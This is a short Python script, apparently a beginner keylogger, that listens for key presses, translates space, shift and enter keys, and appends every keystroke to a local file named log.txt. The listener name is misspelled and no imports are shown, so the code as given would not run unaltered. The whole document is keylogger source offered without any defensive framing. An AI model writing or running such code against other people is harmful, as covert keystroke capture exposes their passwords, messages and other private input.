
def writetofile(key):
    elements=str(key)
    elements=elements.replace("'","")

    if elements == 'Key.space':
        elements=' '
    
    if elements == 'Key.shift_r':
        elements=''
    
    if elements == 'Key.shift_l':
        elements=""
    
    if elements == 'Key.enter':
        elements="\n"
    

    with open('log.txt','a') as f:
        f.write(elements)

with listner(on_press=writetofile) as l:
    l.join()